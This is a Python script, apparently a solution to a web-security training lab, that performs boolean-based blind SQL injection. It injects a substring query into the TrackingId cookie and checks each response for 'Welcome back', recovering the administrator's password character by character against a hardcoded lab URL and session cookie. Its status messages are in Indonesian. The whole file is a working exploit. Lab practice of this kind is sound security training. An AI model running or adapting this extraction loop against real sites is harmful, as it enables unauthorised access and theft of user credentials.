import string
import requests
import time

url = "https://0a47009d0489bc11c0810e0400f40047.web-security-academy.net/"
password = "eu2"
index = 4

while True:
	for x in string.printable[0:36]:
		payload = f"' and (select substring(password,{index},1) from users where username='administrator')='{x}'--'"
		print(payload)
		cookies = {
		"session":"YsrEwux0VtJ5bh6j40VgFm3b14lABJ9L",
		"TrackingId":f"77LQ4oOm5PThou5t{payload}"
		}

		response = requests.get(url,cookies=cookies).text
		if("Welcome back" in str(response)):
			print(f"ada di karakter {x}")
			password += x
		else:
			print(f"bukan karakter {x}")

		time.sleep(1)
	index += 1
	if(len(password) == 20):
		print(f"password terakhir {password}")
		break
	print(f"password saat ini {password}")

